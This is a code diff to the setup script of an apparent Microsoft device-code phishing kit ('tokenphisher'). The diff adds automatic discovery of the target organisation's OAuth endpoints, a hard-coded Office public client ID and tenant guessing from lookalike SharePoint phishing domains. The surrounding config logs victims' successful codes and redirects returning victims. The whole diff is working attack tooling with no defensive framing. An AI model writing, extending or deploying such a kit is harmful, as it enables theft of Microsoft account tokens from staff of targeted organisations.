@@ -22,18 +22,24 @@ const DEFAULT_CERT_STORE =
 const CLOUDFLARE_ORIGIN_CA =
   'https://developers.cloudflare.com/ssl/static/origin_ca_rsa_root.pem';
 
+// Public Microsoft client ID (Office) — not published in OpenID discovery.
+const DEFAULT_MS_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+
+const DEFAULT_REDIRECT_URL = 'https://www.microsoft.com';
+const DEFAULT_ALREADY_LOGGED_IN_URL = 'https://onedrive.live.com/';
+
 const DEFAULT_CONFIG = {
   httpPort: 80,
   httpsPort: 443,
   testMode: false,
   debug: false,
-  clientId: 'd3590ed6-52b3-4102-aeff-aad2292ab01c',
-  tokenUrl: 'https://login.microsoftonline.com/Common/oauth2/v2.0/token',
+  clientId: DEFAULT_MS_CLIENT_ID,
+  tokenUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
   deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
   scopes: 'offline_access openid',
   phishingHTML: 'index.html',
-  redirectUrl: 'https://www.microsoft.com',
-  alreadyLoggedInURL: 'https://onedriveURLwithContentOrSomethingElse',
+  redirectUrl: DEFAULT_REDIRECT_URL,
+  alreadyLoggedInURL: DEFAULT_ALREADY_LOGGED_IN_URL,
   cookieExpirationInDays: 90,
   userCodesFile: 'successful_user_code_cookies.txt',
   logFile: 'logfile.txt',
@@ -58,17 +64,21 @@ Usage:
   node setup.mjs [options]
 
 Required for production TLS (Cloudflare):
-  --domain <hostname>           Hostname served by this app (e.g. share.example.com)
+  --domain <hostname>           Phishing hostname / TLS cert name (e.g. share.example.com)
   --cf-token <token>            Cloudflare API token (or CLOUDFLARE_API_TOKEN env var)
                                 Needs Account: Cloudflare Origin CA:Edit and Zone:Read
+
+Microsoft OAuth (auto-configured from OpenID discovery):
+  --tenant <domain>             Microsoft tenant domain (e.g. gipi.com). Auto-guessed from
+                                --domain when it looks like *.sharepoint.* phishing hosts.
 
 Common options:
   --cert-store <path>           Persistent cert directory (default: /var/lib/tokenphisher/certs as root)
   --force-renew                 Request a new certificate even if a valid one exists
-  --redirect-url <url>          Redirect for / and blocked geo IPs
-  --already-logged-in-url <url> Redirect for returning victims
+  --redirect-url <url>          Override redirect for / and blocked geo IPs (default: microsoft.com)
+  --already-logged-in-url <url> Override return-visitor redirect (default: onedrive.live.com)
   --geoip <codes>               Comma-separated ISO country codes (default: CH)
-  --client-id <id>              OAuth client ID
+  --client-id <id>              Override OAuth client ID (default: MS Office public client)
   --scopes <scopes>             OAuth scopes (space-separated)
   --debug                       Enable debug logging
   --test-mode                   HTTP only, no TLS (local testing)
@@ -78,11 +88,15 @@ Common options:
 
 Examples:
   CLOUDFLARE_API_TOKEN=xxx node setup.mjs \\
-    --domain share.example.com \\
-    --redirect-url https://www.microsoft.com \\
-    --already-logged-in-url https://onedrive.live.com/...
+    --domain gipi.sharepoint.com.documents.v06.zip \\
+    --tenant gipi.com
 
-  node setup.mjs --test-mode --redirect-url https://http.cat
+  node setup.mjs --test-mode --tenant contoso.com
+
+Microsoft setup notes:
+  - tokenUrl and deviceCodeUrl are fetched from /.well-known/openid-configuration.
+  - clientId uses the standard MS Office public client (not in OpenID discovery).
+  - Branded tenant login page is shown when tenant-specific endpoints are used.
 
 Cloudflare setup notes:
   - Domain must already use Cloudflare DNS (orange-cloud proxy recommended).
@@ -185,6 +199,83 @@ function parseGeoip(value) {
     .split(',')
     .map((code) => code.trim().toUpperCase())
     .filter(Boolean);
+}
+
+function guessMicrosoftTenantCandidates(phishingDomain) {
+  const candidates = [];
+  const sharepointMatch = phishingDomain.match(/^([^.]+)\.sharepoint\./i);
+  if (sharepointMatch) {
+    const org = sharepointMatch[1].toLowerCase();
+    candidates.push(`${org}.com`, `${org}.onmicrosoft.com`);
+  }
+
+  const zone = zoneNameFromHostname(phishingDomain);
+  if (zone && !candidates.includes(zone)) {
+    candidates.push(zone);
+  }
+
+  return [...new Set(candidates)];
+}
+
+function tenantIdFromIssuer(issuer) {
+  const match = issuer?.match(/login\.microsoftonline\.com\/([^/]+)\//i);
+  return match?.[1] ?? null;
+}
+
+async function fetchMicrosoftOpenIdConfig(tenant) {
+  const url = `https://login.microsoftonline.com/${encodeURIComponent(tenant)}/v2.0/.well-known/openid-configuration`;
+  const response = await fetch(url);
+  if (!response.ok) {
+    throw new Error(`HTTP ${response.status} for tenant "${tenant}"`);
+  }
+
+  const discovery = await response.json();
+  if (!discovery.token_endpoint || !discovery.device_authorization_endpoint) {
+    throw new Error(`OpenID discovery for "${tenant}" is missing required endpoints`);
+  }
+
+  return {
+    tenant,
+    tenantId: tenantIdFromIssuer(discovery.issuer),
+    tokenUrl: discovery.token_endpoint,
+    deviceCodeUrl: discovery.device_authorization_endpoint,
+    issuer: discovery.issuer,
+  };
+}
+
+async function discoverMicrosoftOAuth({ tenant, phishingDomain }) {
+  const candidates = tenant
+    ? [tenant]
+    : phishingDomain
+      ? guessMicrosoftTenantCandidates(phishingDomain)
+      : [];
+
+  if (!candidates.length) {
+    return null;
+  }
+
+  const failures = [];
+  for (const candidate of candidates) {
+    try {
+      const result = await fetchMicrosoftOpenIdConfig(candidate);
+      return result;
+    } catch (error) {
+      failures.push(`${candidate}: ${error.message}`);
+    }
+  }
+
+  throw new Error(
+    `Could not discover Microsoft tenant OAuth endpoints.\n` +
+      `Tried: ${failures.join('; ')}\n` +
+      `Pass --tenant explicitly (e.g. --tenant gipi.com).`
+  );
+}
+
+function applyMicrosoftOAuthConfig(config, discovery) {
+  config.tokenUrl = discovery.tokenUrl;
+  config.deviceCodeUrl = discovery.deviceCodeUrl;
+  config.microsoftTenant = discovery.tenant;
+  config.microsoftTenantId = discovery.tenantId;
 }
 
 async function cloudflareRequest(token, method, endpoint, body) {
@@ -365,6 +456,7 @@ async function main() {
   const { values } = parseArgs({
     options: {
       domain: { type: 'string' },
+      tenant: { type: 'string' },
       'cf-token': { type: 'string' },
       'redirect-url': { type: 'string' },
       'already-logged-in-url': { type: 'string' },
@@ -404,7 +496,20 @@ async function main() {
 
   const cfToken = values['cf-token'] || process.env.CLOUDFLARE_API_TOKEN;
   const domain = values.domain;
+  const tenant = values.tenant;
   const certStoreRoot = path.resolve(values['cert-store'] || DEFAULT_CERT_STORE);
+
+  if (tenant || domain) {
+    console.log('Discovering Microsoft OAuth endpoints from OpenID configuration ...');
+    const discovery = await discoverMicrosoftOAuth({ tenant, phishingDomain: domain });
+    if (discovery) {
+      applyMicrosoftOAuthConfig(config, discovery);
+      console.log(`Microsoft tenant: ${discovery.tenant} (${discovery.tenantId})`);
+      console.log(`  tokenUrl: ${config.tokenUrl}`);
+      console.log(`  deviceCodeUrl: ${config.deviceCodeUrl}`);
+      console.log(`  clientId: ${config.clientId} (MS Office public client — override with --client-id)`);
+    }
+  }
 
   if (!values['test-mode'] && !values['config-only']) {
     if (!domain) {
